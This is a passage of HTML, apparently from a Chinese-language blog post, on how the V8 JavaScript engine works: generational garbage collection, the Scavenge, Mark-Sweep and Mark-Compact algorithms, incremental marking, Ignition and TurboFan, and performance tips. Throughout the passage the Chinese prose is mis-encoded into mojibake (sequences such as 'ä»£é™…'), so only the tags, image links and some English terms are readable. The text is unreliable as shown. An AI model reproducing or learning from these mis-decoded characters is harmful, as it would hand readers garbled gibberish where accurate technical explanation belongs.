id="ä»£é™…å‡è¯´å’Œåˆ†ä»£æ”¶é›†"><a href="#ä»£é™…å‡è¯´å’Œåˆ†ä»£æ”¶é›†" class="headerlink" title="ä»£é™…å‡è¯´å’Œåˆ†ä»£æ”¶é›†"></a>ä»£é™…å‡è¯´å’Œåˆ†ä»£æ”¶é›†</h4><p><strong>ä»£é™…å‡è¯´</strong>æœ‰ä»¥ä¸‹ä¸¤ä¸ªç‰¹ç‚¹ï¼š</p><ul><li>ç¬¬ä¸€ä¸ªæ˜¯å¤§éƒ¨åˆ†å¯¹è±¡åœ¨å†…å­˜ä¸­å­˜åœ¨çš„æ—¶é—´å¾ˆçŸ­ï¼Œç®€å•æ¥è¯´ï¼Œå°±æ˜¯å¾ˆå¤šå¯¹è±¡ä¸€ç»åˆ†é…å†…å­˜ï¼Œå¾ˆå¿«å°±å˜å¾—ä¸å¯è®¿é—®ï¼›</li><li>ç¬¬äºŒä¸ªæ˜¯ä¸æ­»çš„å¯¹è±¡ï¼Œä¼šæ´»å¾—æ›´ä¹…ã€‚</li></ul><p>åœ¨ V8 ä¸­ä¼šæŠŠå †åˆ†ä¸º<strong>æ–°ç”Ÿä»£</strong>å’Œ<strong>è€ç”Ÿä»£</strong>ä¸¤ä¸ªåŒºåŸŸï¼Œ<strong>æ–°ç”Ÿä»£ä¸­å­˜æ”¾çš„æ˜¯ç”Ÿå­˜æ—¶é—´çŸ­çš„å¯¹è±¡ï¼Œè€ç”Ÿä»£ä¸­å­˜æ”¾çš„ç”Ÿå­˜æ—¶é—´ä¹…çš„å¯¹è±¡</strong>ã€‚æ–°ç”ŸåŒºé€šå¸¸åªæ”¯æŒ 1ï½8M çš„å®¹é‡ï¼Œè€Œè€ç”ŸåŒºæ”¯æŒçš„å®¹é‡å°±å¤§å¾ˆå¤šäº†ã€‚å¯¹äºè¿™ä¸¤å—åŒºåŸŸï¼ŒV8 åˆ†åˆ«ä½¿ç”¨ä¸¤ä¸ªä¸åŒçš„åƒåœ¾å›æ”¶å™¨ï¼Œä»¥ä¾¿æ›´é«˜æ•ˆåœ°å®æ–½åƒåœ¾å›æ”¶ã€‚</p><ul><li><strong>å‰¯åƒåœ¾å›æ”¶å™¨ï¼Œä¸»è¦è´Ÿè´£æ–°ç”Ÿä»£çš„åƒåœ¾å›æ”¶ã€‚</strong></li><li><strong>ä¸»åƒåœ¾å›æ”¶å™¨ï¼Œä¸»è¦è´Ÿè´£è€ç”Ÿä»£çš„åƒåœ¾å›æ”¶ã€‚</strong></li></ul><h4 id="åƒåœ¾å›æ”¶å™¨çš„å·¥ä½œæµç¨‹"><a href="#åƒåœ¾å›æ”¶å™¨çš„å·¥ä½œæµç¨‹" class="headerlink" title="åƒåœ¾å›æ”¶å™¨çš„å·¥ä½œæµç¨‹"></a>åƒåœ¾å›æ”¶å™¨çš„å·¥ä½œæµç¨‹</h4><p><strong>ä¸è®ºä»€ä¹ˆç±»å‹çš„åƒåœ¾å›æ”¶å™¨ï¼Œå®ƒä»¬éƒ½æœ‰ä¸€å¥—å…±åŒçš„æ‰§è¡Œæµç¨‹</strong>ã€‚</p><p>ç¬¬ä¸€æ­¥æ˜¯æ ‡è®°ç©ºé—´ä¸­æ´»åŠ¨å¯¹è±¡å’Œéæ´»åŠ¨å¯¹è±¡ã€‚æ‰€è°“æ´»åŠ¨å¯¹è±¡å°±æ˜¯è¿˜åœ¨ä½¿ç”¨çš„å¯¹è±¡ï¼Œéæ´»åŠ¨å¯¹è±¡å°±æ˜¯å¯ä»¥è¿›è¡Œåƒåœ¾å›æ”¶çš„å¯¹è±¡ã€‚</p><p>ç¬¬äºŒæ­¥æ˜¯å›æ”¶éæ´»åŠ¨å¯¹è±¡æ‰€å æ®çš„å†…å­˜ã€‚å…¶å®å°±æ˜¯åœ¨æ‰€æœ‰çš„æ ‡è®°å®Œæˆä¹‹åï¼Œç»Ÿä¸€æ¸…ç†å†…å­˜ä¸­æ‰€æœ‰è¢«æ ‡è®°ä¸ºå¯å›æ”¶çš„å¯¹è±¡ã€‚</p><p>ç¬¬ä¸‰æ­¥æ˜¯åšå†…å­˜æ•´ç†ã€‚ä¸€èˆ¬æ¥è¯´ï¼Œé¢‘ç¹å›æ”¶å¯¹è±¡åï¼Œå†…å­˜ä¸­å°±ä¼šå­˜åœ¨å¤§é‡ä¸è¿ç»­ç©ºé—´ï¼Œæˆ‘ä»¬æŠŠè¿™äº›ä¸è¿ç»­çš„å†…å­˜ç©ºé—´ç§°ä¸º<strong>å†…å­˜ç¢ç‰‡</strong>ã€‚å½“å†…å­˜ä¸­å‡ºç°äº†å¤§é‡çš„å†…å­˜ç¢ç‰‡ä¹‹åï¼Œå¦‚æœéœ€è¦åˆ†é…è¾ƒå¤§è¿ç»­å†…å­˜çš„æ—¶å€™ï¼Œå°±æœ‰å¯èƒ½å‡ºç°å†…å­˜ä¸è¶³çš„æƒ…å†µã€‚</p><h4 id="å‰¯åƒåœ¾å›æ”¶å™¨"><a href="#å‰¯åƒåœ¾å›æ”¶å™¨" class="headerlink" title="å‰¯åƒåœ¾å›æ”¶å™¨"></a>å‰¯åƒåœ¾å›æ”¶å™¨</h4><p>é€šå¸¸æƒ…å†µä¸‹ï¼Œå¤§å¤šæ•°å°çš„å¯¹è±¡éƒ½ä¼šè¢«åˆ†é…åˆ°æ–°ç”ŸåŒºï¼Œæ‰€ä»¥è¯´è¿™ä¸ªåŒºåŸŸè™½ç„¶ä¸å¤§ï¼Œä½†æ˜¯åƒåœ¾å›æ”¶è¿˜æ˜¯æ¯”è¾ƒé¢‘ç¹çš„ã€‚</p><p><img src="https://i.loli.net/2021/06/14/sYxBfKQ2dlXUOvD.jpg" alt="Snipaste_2021-06-14_16-08-17.jpg"></p><p>æ–°ç”Ÿä»£ä¸­ç”¨<strong>Scavenge ç®—æ³•</strong>æ¥å¤„ç†ã€‚æ‰€è°“ Scavenge ç®—æ³•ï¼Œæ˜¯æŠŠæ–°ç”Ÿä»£ç©ºé—´å¯¹åŠåˆ’åˆ†ä¸ºä¸¤ä¸ªåŒºåŸŸï¼Œä¸€åŠæ˜¯å¯¹è±¡åŒºåŸŸï¼Œä¸€åŠæ˜¯ç©ºé—²åŒºåŸŸã€‚</p><p>æ–°åŠ å…¥çš„å¯¹è±¡éƒ½ä¼šå­˜æ”¾åˆ°å¯¹è±¡åŒºåŸŸï¼Œå½“å¯¹è±¡åŒºåŸŸå¿«è¢«å†™æ»¡æ—¶ï¼Œå°±éœ€è¦æ‰§è¡Œä¸€æ¬¡åƒåœ¾æ¸…ç†æ“ä½œã€‚</p><p>åœ¨åƒåœ¾å›æ”¶è¿‡ç¨‹ä¸­ï¼Œé¦–å…ˆè¦å¯¹å¯¹è±¡åŒºåŸŸä¸­çš„åƒåœ¾åšæ ‡è®°ï¼›æ ‡è®°å®Œæˆä¹‹åï¼Œå°±è¿›å…¥åƒåœ¾æ¸…ç†é˜¶æ®µï¼Œå‰¯åƒåœ¾å›æ”¶å™¨ä¼šæŠŠè¿™äº›å­˜æ´»çš„å¯¹è±¡å¤åˆ¶åˆ°ç©ºé—²åŒºåŸŸä¸­ï¼ŒåŒæ—¶å®ƒè¿˜ä¼šæŠŠè¿™äº›å¯¹è±¡æœ‰åºåœ°æ’åˆ—èµ·æ¥ï¼Œæ‰€ä»¥è¿™ä¸ªå¤åˆ¶è¿‡ç¨‹ï¼Œä¹Ÿå°±ç›¸å½“äºå®Œæˆäº†å†…å­˜æ•´ç†æ“ä½œï¼Œå¤åˆ¶åç©ºé—²åŒºåŸŸå°±æ²¡æœ‰å†…å­˜ç¢ç‰‡äº†ã€‚</p><p>å®Œæˆå¤åˆ¶åï¼Œå¯¹è±¡åŒºåŸŸä¸ç©ºé—²åŒºåŸŸè¿›è¡Œè§’è‰²ç¿»è½¬ï¼Œä¹Ÿå°±æ˜¯åŸæ¥çš„å¯¹è±¡åŒºåŸŸå˜æˆç©ºé—²åŒºåŸŸï¼ŒåŸæ¥çš„ç©ºé—²åŒºåŸŸå˜æˆäº†å¯¹è±¡åŒºåŸŸã€‚è¿™æ ·å°±å®Œæˆäº†åƒåœ¾å¯¹è±¡çš„å›æ”¶æ“ä½œï¼ŒåŒæ—¶è¿™ç§<strong>è§’è‰²ç¿»è½¬çš„æ“ä½œè¿˜èƒ½è®©æ–°ç”Ÿä»£ä¸­çš„è¿™ä¸¤å—åŒºåŸŸæ— é™é‡å¤ä½¿ç”¨ä¸‹å»</strong>ã€‚</p><p>ç”±äºæ–°ç”Ÿä»£ä¸­é‡‡ç”¨çš„ Scavenge ç®—æ³•ï¼Œæ‰€ä»¥æ¯æ¬¡æ‰§è¡Œæ¸…ç†æ“ä½œæ—¶ï¼Œéƒ½éœ€è¦å°†å­˜æ´»çš„å¯¹è±¡ä»å¯¹è±¡åŒºåŸŸå¤åˆ¶åˆ°ç©ºé—²åŒºåŸŸã€‚ä½†å¤åˆ¶æ“ä½œéœ€è¦æ—¶é—´æˆæœ¬ï¼Œå¦‚æœæ–°ç”ŸåŒºç©ºé—´è®¾ç½®å¾—å¤ªå¤§äº†ï¼Œé‚£ä¹ˆæ¯æ¬¡æ¸…ç†çš„æ—¶é—´å°±ä¼šè¿‡ä¹…ï¼Œæ‰€ä»¥<strong>ä¸ºäº†æ‰§è¡Œæ•ˆç‡ï¼Œä¸€èˆ¬æ–°ç”ŸåŒºçš„ç©ºé—´ä¼šè¢«è®¾ç½®å¾—æ¯”è¾ƒå°</strong>ã€‚</p><p>ä¹Ÿæ­£æ˜¯å› ä¸ºæ–°ç”ŸåŒºçš„ç©ºé—´ä¸å¤§ï¼Œæ‰€ä»¥å¾ˆå®¹æ˜“è¢«å­˜æ´»çš„å¯¹è±¡è£…æ»¡æ•´ä¸ªåŒºåŸŸã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼ŒJavaScript å¼•æ“é‡‡ç”¨äº†<strong>å¯¹è±¡æ™‹å‡ç­–ç•¥</strong>ï¼Œä¹Ÿå°±æ˜¯ç»è¿‡ä¸¤æ¬¡åƒåœ¾å›æ”¶ä¾ç„¶è¿˜å­˜æ´»çš„å¯¹è±¡ï¼Œä¼šè¢«ç§»åŠ¨åˆ°è€ç”ŸåŒºä¸­ã€‚</p><h4 id="ä¸»åƒåœ¾å›æ”¶å™¨"><a href="#ä¸»åƒåœ¾å›æ”¶å™¨" class="headerlink" title="ä¸»åƒåœ¾å›æ”¶å™¨"></a>ä¸»åƒåœ¾å›æ”¶å™¨</h4><p>ä¸€äº›å¤§çš„å¯¹è±¡ä¼šç›´æ¥è¢«åˆ†é…åˆ°è€ç”ŸåŒºã€‚å› æ­¤è€ç”ŸåŒºä¸­çš„å¯¹è±¡æœ‰ä¸¤ä¸ªç‰¹ç‚¹ï¼Œä¸€ä¸ªæ˜¯å¯¹è±¡å ç”¨ç©ºé—´å¤§ï¼Œå¦ä¸€ä¸ªæ˜¯å¯¹è±¡å­˜æ´»æ—¶é—´é•¿ã€‚</p><p>ä¸»åƒåœ¾å›æ”¶å™¨æ˜¯é‡‡ç”¨<strong>æ ‡è®° - æ¸…é™¤ï¼ˆMark-Sweepï¼‰</strong>çš„ç®—æ³•è¿›è¡Œåƒåœ¾å›æ”¶ã€‚é¦–å…ˆæ˜¯æ ‡è®°è¿‡ç¨‹é˜¶æ®µã€‚æ ‡è®°é˜¶æ®µå°±æ˜¯ä»ä¸€ç»„æ ¹å…ƒç´ å¼€å§‹ï¼Œé€’å½’éå†è¿™ç»„æ ¹å…ƒç´ ï¼Œåœ¨è¿™ä¸ªéå†è¿‡ç¨‹ä¸­ï¼Œèƒ½åˆ°è¾¾çš„å…ƒç´ ç§°ä¸º<strong>æ´»åŠ¨å¯¹è±¡</strong>ï¼Œæ²¡æœ‰åˆ°è¾¾çš„å…ƒç´ å°±å¯ä»¥åˆ¤æ–­ä¸º<strong>åƒåœ¾æ•°æ®</strong>ã€‚</p><p>æ¥ä¸‹æ¥å°±æ˜¯åƒåœ¾çš„æ¸…é™¤è¿‡ç¨‹ã€‚å®ƒå’Œå‰¯åƒåœ¾å›æ”¶å™¨çš„åƒåœ¾æ¸…é™¤è¿‡ç¨‹å®Œå…¨ä¸åŒï¼Œå¯ä»¥ç†è§£è¿™ä¸ªè¿‡ç¨‹æ˜¯æ¸…é™¤æ‰çº¢è‰²æ ‡è®°æ•°æ®çš„è¿‡ç¨‹ï¼Œå¯å‚è€ƒä¸‹å›¾å¤§è‡´ç†è§£ä¸‹å…¶æ¸…é™¤è¿‡ç¨‹ï¼š</p><p><img src="https://i.loli.net/2021/06/14/5HYsMJtWfvkRIw2.jpg" alt="Snipaste_2021-06-14_16-10-01.jpg"></p><p>ä¸è¿‡å¯¹ä¸€å—å†…å­˜å¤šæ¬¡æ‰§è¡Œæ ‡è®° - æ¸…é™¤ç®—æ³•åï¼Œä¼šäº§ç”Ÿå¤§é‡ä¸è¿ç»­çš„å†…å­˜ç¢ç‰‡ã€‚è€Œç¢ç‰‡è¿‡å¤šä¼šå¯¼è‡´å¤§å¯¹è±¡æ— æ³•åˆ†é…åˆ°è¶³å¤Ÿçš„è¿ç»­å†…å­˜ï¼Œäºæ˜¯åˆäº§ç”Ÿäº†å¦å¤–ä¸€ç§ç®—æ³•â€”â€”<strong>æ ‡è®° - æ•´ç†ï¼ˆMark-Compactï¼‰</strong>ï¼Œè¿™ä¸ªæ ‡è®°è¿‡ç¨‹ä»ç„¶ä¸æ ‡è®° - æ¸…é™¤ç®—æ³•é‡Œçš„æ˜¯ä¸€æ ·çš„ï¼Œä½†åç»­æ­¥éª¤ä¸æ˜¯ç›´æ¥å¯¹å¯å›æ”¶å¯¹è±¡è¿›è¡Œæ¸…ç†ï¼Œè€Œæ˜¯è®©æ‰€æœ‰å­˜æ´»çš„å¯¹è±¡éƒ½å‘ä¸€ç«¯ç§»åŠ¨ï¼Œç„¶åç›´æ¥æ¸…ç†æ‰ç«¯è¾¹ç•Œä»¥å¤–çš„å†…å­˜ã€‚å¯ä»¥å‚è€ƒä¸‹å›¾ï¼š</p><p><img src="https://i.loli.net/2021/06/14/AJstiWxBMYI6pof.jpg" alt="Snipaste_2021-06-14_16-10-53.jpg"></p><h4 id="å…¨åœé¡¿"><a href="#å…¨åœé¡¿" class="headerlink" title="å…¨åœé¡¿"></a>å…¨åœé¡¿</h4><p>ä¸€æ—¦æ‰§è¡Œåƒåœ¾å›æ”¶ç®—æ³•ï¼Œéƒ½éœ€è¦å°†æ­£åœ¨æ‰§è¡Œçš„ JavaScript è„šæœ¬æš‚åœä¸‹æ¥ï¼Œå¾…åƒåœ¾å›æ”¶å®Œæ¯•åå†æ¢å¤è„šæœ¬æ‰§è¡Œã€‚æˆ‘ä»¬æŠŠè¿™ç§è¡Œä¸ºå«åš<strong>å…¨åœé¡¿ï¼ˆStop-The-Worldï¼‰</strong>ã€‚</p><p>åœ¨ V8 æ–°ç”Ÿä»£çš„åƒåœ¾å›æ”¶ä¸­ï¼Œå› å…¶ç©ºé—´è¾ƒå°ï¼Œä¸”å­˜æ´»å¯¹è±¡è¾ƒå°‘ï¼Œæ‰€ä»¥å…¨åœé¡¿çš„å½±å“ä¸å¤§ï¼Œä½†è€ç”Ÿä»£å°±ä¸ä¸€æ ·ã€‚ä¸ºäº†é™ä½è€ç”Ÿä»£çš„åƒåœ¾å›æ”¶è€Œé€ æˆçš„å¡é¡¿ï¼ŒV8 å°†æ ‡è®°è¿‡ç¨‹åˆ†ä¸ºä¸€ä¸ªä¸ªçš„å­æ ‡è®°è¿‡ç¨‹ï¼ŒåŒæ—¶è®©åƒåœ¾å›æ”¶æ ‡è®°å’Œ JavaScript åº”ç”¨é€»è¾‘äº¤æ›¿è¿›è¡Œï¼Œç›´åˆ°æ ‡è®°é˜¶æ®µå®Œæˆï¼Œæˆ‘ä»¬æŠŠè¿™ä¸ªç®—æ³•ç§°ä¸º<strong>å¢é‡æ ‡è®°ï¼ˆIncremental Markingï¼‰ç®—æ³•</strong>ã€‚å¦‚ä¸‹å›¾æ‰€ç¤ºï¼š</p><p><img src="https://i.loli.net/2021/06/14/yo1ZYa8LJWk95ze.jpg" alt="Snipaste_2021-06-14_16-12-19.jpg"></p><p>ä½¿ç”¨å¢é‡æ ‡è®°ç®—æ³•ï¼Œå¯ä»¥æŠŠä¸€ä¸ªå®Œæ•´çš„åƒåœ¾å›æ”¶ä»»åŠ¡æ‹†åˆ†ä¸ºå¾ˆå¤šå°çš„ä»»åŠ¡ï¼Œè¿™äº›å°çš„ä»»åŠ¡æ‰§è¡Œæ—¶é—´æ¯”è¾ƒçŸ­ï¼Œå¯ä»¥ç©¿æ’åœ¨å…¶ä»–çš„ JavaScript ä»»åŠ¡ä¸­é—´æ‰§è¡Œã€‚</p><h2 id="V8-æ‰§è¡Œä»£ç "><a href="#V8-æ‰§è¡Œä»£ç " class="headerlink" title="V8 æ‰§è¡Œä»£ç "></a>V8 æ‰§è¡Œä»£ç </h2><h3 id="ç¼–è¯‘å™¨å’Œè§£é‡Šå™¨"><a href="#ç¼–è¯‘å™¨å’Œè§£é‡Šå™¨" class="headerlink" title="ç¼–è¯‘å™¨å’Œè§£é‡Šå™¨"></a>ç¼–è¯‘å™¨å’Œè§£é‡Šå™¨</h3><p><strong>ç¼–è¯‘å‹è¯­è¨€</strong>åœ¨ç¨‹åºæ‰§è¡Œä¹‹å‰ï¼Œéœ€è¦ç»è¿‡<strong>ç¼–è¯‘å™¨</strong>çš„ç¼–è¯‘è¿‡ç¨‹ï¼Œå¹¶ä¸”ç¼–è¯‘ä¹‹åä¼šç›´æ¥ä¿ç•™æœºå™¨èƒ½è¯»æ‡‚çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè¿™æ ·æ¯æ¬¡è¿è¡Œç¨‹åºæ—¶ï¼Œéƒ½å¯ä»¥ç›´æ¥è¿è¡Œè¯¥äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œè€Œä¸éœ€è¦å†æ¬¡é‡æ–°ç¼–è¯‘äº†ã€‚æ¯”å¦‚ C/C++ã€GO ç­‰éƒ½æ˜¯ç¼–è¯‘å‹è¯­è¨€ã€‚</p><p>è€Œç”±<strong>è§£é‡Šå‹è¯­è¨€</strong>ç¼–å†™çš„ç¨‹åºï¼Œåœ¨æ¯æ¬¡è¿è¡Œæ—¶éƒ½éœ€è¦é€šè¿‡<strong>è§£é‡Šå™¨</strong>å¯¹ç¨‹åºè¿›è¡ŒåŠ¨æ€è§£é‡Šå’Œæ‰§è¡Œã€‚æ¯”å¦‚ Pythonã€JavaScript ç­‰éƒ½å±äºè§£é‡Šå‹è¯­è¨€ã€‚</p><p><img src="https://i.loli.net/2021/06/14/moU4e59sAfbJ3O7.jpg" alt="Snipaste_2021-06-14_16-14-19.jpg"></p><ul><li>åœ¨ç¼–è¯‘å‹è¯­è¨€çš„ç¼–è¯‘è¿‡ç¨‹ä¸­ï¼Œç¼–è¯‘å™¨é¦–å…ˆä¼šä¾æ¬¡å¯¹æºä»£ç è¿›è¡Œè¯æ³•åˆ†æã€è¯­æ³•åˆ†æï¼Œç”ŸæˆæŠ½è±¡è¯­æ³•æ ‘ï¼ˆASTï¼‰ï¼Œç„¶åæ˜¯ä¼˜åŒ–ä»£ç ï¼Œæœ€åå†ç”Ÿæˆå¤„ç†å™¨èƒ½å¤Ÿç†è§£çš„æœºå™¨ç ã€‚å¦‚æœç¼–è¯‘æˆåŠŸï¼Œå°†ä¼šç”Ÿæˆä¸€ä¸ªå¯æ‰§è¡Œçš„æ–‡ä»¶ã€‚ä½†å¦‚æœç¼–è¯‘è¿‡ç¨‹å‘ç”Ÿäº†è¯­æ³•æˆ–è€…å…¶ä»–çš„é”™è¯¯ï¼Œé‚£ä¹ˆç¼–è¯‘å™¨å°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œæœ€åçš„äºŒè¿›åˆ¶æ–‡ä»¶ä¹Ÿä¸ä¼šç”ŸæˆæˆåŠŸã€‚</li><li>åœ¨è§£é‡Šå‹è¯­è¨€çš„è§£é‡Šè¿‡ç¨‹ä¸­ï¼ŒåŒæ ·è§£é‡Šå™¨ä¹Ÿä¼šå¯¹æºä»£ç è¿›è¡Œè¯æ³•åˆ†æã€è¯­æ³•åˆ†æï¼Œå¹¶ç”ŸæˆæŠ½è±¡è¯­æ³•æ ‘ï¼ˆASTï¼‰ï¼Œä¸è¿‡å®ƒä¼šå†åŸºäºæŠ½è±¡è¯­æ³•æ ‘ç”Ÿæˆå­—èŠ‚ç ï¼Œæœ€åå†æ ¹æ®å­—èŠ‚ç æ¥æ‰§è¡Œç¨‹åºã€è¾“å‡ºç»“æœã€‚</li></ul><h3 id="V8-æ˜¯å¦‚ä½•æ‰§è¡Œä¸€æ®µ-JavaScript-ä»£ç çš„"><a href="#V8-æ˜¯å¦‚ä½•æ‰§è¡Œä¸€æ®µ-JavaScript-ä»£ç çš„" class="headerlink" title="V8 æ˜¯å¦‚ä½•æ‰§è¡Œä¸€æ®µ JavaScript ä»£ç çš„"></a>V8 æ˜¯å¦‚ä½•æ‰§è¡Œä¸€æ®µ JavaScript ä»£ç çš„</h3><p><img src="https://i.loli.net/2021/06/14/q7Y9LpBNKa3ADGh.jpg" alt="Snipaste_2021-06-14_16-15-31.jpg"></p><p>V8 åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­æ—¢æœ‰<strong>è§£é‡Šå™¨ Ignition</strong>ï¼Œåˆæœ‰<strong>ç¼–è¯‘å™¨ TurboFan</strong></p><h4 id="1-ç”ŸæˆæŠ½è±¡è¯­æ³•æ ‘ï¼ˆASTï¼‰å’Œæ‰§è¡Œä¸Šä¸‹æ–‡"><a href="#1-ç”ŸæˆæŠ½è±¡è¯­æ³•æ ‘ï¼ˆASTï¼‰å’Œæ‰§è¡Œä¸Šä¸‹æ–‡" class="headerlink" title="1. ç”ŸæˆæŠ½è±¡è¯­æ³•æ ‘ï¼ˆASTï¼‰å’Œæ‰§è¡Œä¸Šä¸‹æ–‡"></a>1. ç”ŸæˆæŠ½è±¡è¯­æ³•æ ‘ï¼ˆASTï¼‰å’Œæ‰§è¡Œä¸Šä¸‹æ–‡</h4><p>AST æ˜¯éå¸¸é‡è¦çš„ä¸€ç§æ•°æ®ç»“æ„ï¼Œåœ¨å¾ˆå¤šé¡¹ç›®ä¸­æœ‰ç€å¹¿æ³›çš„åº”ç”¨ã€‚å…¶ä¸­æœ€è‘—åçš„ä¸€ä¸ªé¡¹ç›®æ˜¯ Babelã€‚Babel çš„å·¥ä½œåŸç†å°±æ˜¯å…ˆå°† ES6 æºç è½¬æ¢ä¸º ASTï¼Œç„¶åå†å°† ES6 è¯­æ³•çš„ AST è½¬æ¢ä¸º ES5 è¯­æ³•çš„ ASTï¼Œæœ€ååˆ©ç”¨ ES5 çš„ AST ç”Ÿæˆ JavaScript æºä»£ç ã€‚</p><p>é™¤äº† Babel å¤–ï¼Œè¿˜æœ‰ ESLint ä¹Ÿä½¿ç”¨ ASTã€‚ESLint æ˜¯ä¸€ä¸ªç”¨æ¥æ£€æŸ¥ JavaScript ç¼–å†™è§„èŒƒçš„æ’ä»¶ï¼Œå…¶æ£€æµ‹æµç¨‹ä¹Ÿæ˜¯éœ€è¦å°†æºç è½¬æ¢ä¸º ASTï¼Œç„¶åå†åˆ©ç”¨ AST æ¥æ£€æŸ¥ä»£ç è§„èŒƒåŒ–çš„é—®é¢˜ã€‚</p><p>é€šå¸¸ï¼Œç”Ÿæˆ AST éœ€è¦ç»è¿‡ä¸¤ä¸ªé˜¶æ®µã€‚</p><p><strong>ç¬¬ä¸€é˜¶æ®µæ˜¯åˆ†è¯ï¼ˆtokenizeï¼‰ï¼Œåˆç§°ä¸ºè¯æ³•åˆ†æ</strong>ï¼Œå…¶ä½œç”¨æ˜¯å°†ä¸€è¡Œè¡Œçš„æºç æ‹†è§£æˆä¸€ä¸ªä¸ª tokenã€‚æ‰€è°“<strong>token</strong>ï¼ŒæŒ‡çš„æ˜¯è¯­æ³•ä¸Šä¸å¯èƒ½å†åˆ†çš„ã€æœ€å°çš„å•ä¸ªå­—ç¬¦æˆ–å­—ç¬¦ä¸²ã€‚</p><p><img src="https://i.loli.net/2021/06/14/vgzrFh48SEIMRoi.jpg" alt="Snipaste_2021-06-14_16-17-33.jpg"></p><p>å…¶ä¸­å…³é”®å­—â€œvarâ€ã€æ ‡è¯†ç¬¦â€œmyNameâ€ ã€èµ‹å€¼è¿ç®—ç¬¦â€œ=â€ã€å­—ç¬¦ä¸²â€œæå®¢æ—¶é—´â€å››ä¸ªéƒ½æ˜¯ tokenã€‚</p><p><strong>ç¬¬äºŒé˜¶æ®µæ˜¯è§£æï¼ˆparseï¼‰ï¼Œåˆç§°ä¸ºè¯­æ³•åˆ†æ</strong>ï¼Œå…¶ä½œç”¨æ˜¯å°†ä¸Šä¸€æ­¥ç”Ÿæˆçš„ token æ•°æ®ï¼Œæ ¹æ®è¯­æ³•è§„åˆ™è½¬ä¸º ASTã€‚å¦‚æœæºç ç¬¦åˆè¯­æ³•è§„åˆ™ï¼Œè¿™ä¸€æ­¥å°±ä¼šé¡ºåˆ©å®Œæˆã€‚ä½†å¦‚æœæºç å­˜åœ¨è¯­æ³•é”™è¯¯ï¼Œè¿™ä¸€æ­¥å°±ä¼šç»ˆæ­¢ï¼Œå¹¶æŠ›å‡ºä¸€ä¸ªâ€œè¯­æ³•é”™è¯¯â€ã€‚</p><h4 id="2-ç”Ÿæˆå­—èŠ‚ç "><a href="#2-ç”Ÿæˆå­—èŠ‚ç " class="headerlink" title="2. ç”Ÿæˆå­—èŠ‚ç "></a>2. ç”Ÿæˆå­—èŠ‚ç </h4><p>å­—èŠ‚ç å°±æ˜¯ä»‹äº AST å’Œæœºå™¨ç ä¹‹é—´çš„ä¸€ç§ä»£ç ã€‚ä½†æ˜¯ä¸ç‰¹å®šç±»å‹çš„æœºå™¨ç æ— å…³ï¼Œå­—èŠ‚ç éœ€è¦é€šè¿‡è§£é‡Šå™¨å°†å…¶è½¬æ¢ä¸ºæœºå™¨ç åæ‰èƒ½æ‰§è¡Œã€‚</p><p><img src="https://i.loli.net/2021/06/14/s3GzL9VoU8iJFbK.jpg" alt="Snipaste_2021-06-14_16-18-52.jpg"></p><h4 id="3-æ‰§è¡Œä»£ç "><a href="#3-æ‰§è¡Œä»£ç " class="headerlink" title="3. æ‰§è¡Œä»£ç "></a>3. æ‰§è¡Œä»£ç </h4><p>é€šå¸¸ï¼Œå¦‚æœæœ‰ä¸€æ®µç¬¬ä¸€æ¬¡æ‰§è¡Œçš„å­—èŠ‚ç ï¼Œè§£é‡Šå™¨ Ignition ä¼šé€æ¡è§£é‡Šæ‰§è¡Œã€‚åœ¨æ‰§è¡Œå­—èŠ‚ç çš„è¿‡ç¨‹ä¸­ï¼Œå¦‚æœå‘ç°æœ‰çƒ­ç‚¹ä»£ç ï¼ˆHotSpotï¼‰ï¼Œæ¯”å¦‚ä¸€æ®µä»£ç è¢«é‡å¤æ‰§è¡Œå¤šæ¬¡ï¼Œè¿™ç§å°±ç§°ä¸º<strong>çƒ­ç‚¹ä»£ç </strong>ï¼Œé‚£ä¹ˆåå°çš„ç¼–è¯‘å™¨ TurboFan å°±ä¼šæŠŠè¯¥æ®µçƒ­ç‚¹çš„å­—èŠ‚ç ç¼–è¯‘ä¸ºé«˜æ•ˆçš„æœºå™¨ç ï¼Œç„¶åå½“å†æ¬¡æ‰§è¡Œè¿™æ®µè¢«ä¼˜åŒ–çš„ä»£ç æ—¶ï¼Œåªéœ€è¦æ‰§è¡Œç¼–è¯‘åçš„æœºå™¨ç å°±å¯ä»¥äº†ï¼Œè¿™æ ·å°±å¤§å¤§æå‡äº†ä»£ç çš„æ‰§è¡Œæ•ˆç‡ã€‚</p><h3 id="JavaScript-çš„æ€§èƒ½ä¼˜åŒ–"><a href="#JavaScript-çš„æ€§èƒ½ä¼˜åŒ–" class="headerlink" title="JavaScript çš„æ€§èƒ½ä¼˜åŒ–"></a>JavaScript çš„æ€§èƒ½ä¼˜åŒ–</h3><p>å°†ä¼˜åŒ–çš„ä¸­å¿ƒèšç„¦åœ¨å•æ¬¡è„šæœ¬çš„æ‰§è¡Œæ—¶é—´å’Œè„šæœ¬çš„ç½‘ç»œä¸‹è½½ä¸Šï¼Œä¸»è¦å…³æ³¨ä»¥ä¸‹ä¸‰ç‚¹å†…å®¹ï¼š</p><ol><li>æå‡å•æ¬¡è„šæœ¬çš„æ‰§è¡Œé€Ÿåº¦ï¼Œé¿å… JavaScript çš„é•¿ä»»åŠ¡éœ¸å ä¸»çº¿ç¨‹ï¼Œè¿™æ ·å¯ä»¥ä½¿å¾—é¡µé¢å¿«é€Ÿå“åº”äº¤äº’ï¼›</li><li>é¿å…å¤§çš„å†…è”è„šæœ¬ï¼Œå› ä¸ºåœ¨è§£æ HTML çš„è¿‡ç¨‹ä¸­ï¼Œè§£æå’Œç¼–è¯‘ä¹Ÿä¼šå ç”¨ä¸»çº¿ç¨‹ï¼›</li><li>å‡å°‘ JavaScript æ–‡ä»¶çš„å®¹é‡ï¼Œå› ä¸ºæ›´å°çš„æ–‡ä»¶ä¼šæå‡ä¸‹è½½é€Ÿåº¦ï¼Œå¹¶ä¸”å ç”¨æ›´ä½çš„å†…å­˜ã€‚</li></ol><hr><h1 id="æµè§ˆå™¨ä¸­çš„é¡µé¢"><a href="#æµè§ˆå™¨ä¸­çš„é¡µé¢" class="headerlink" title="æµè§ˆå™¨ä¸­çš„é¡µé¢"></a>æµè§ˆå™¨ä¸­çš„é¡µé¢</h1><p>Chrome å¼€å‘è€…å·¥å…·é¢æ¿çš„å¤§è‡´åŠŸèƒ½ï¼š</p><p><img 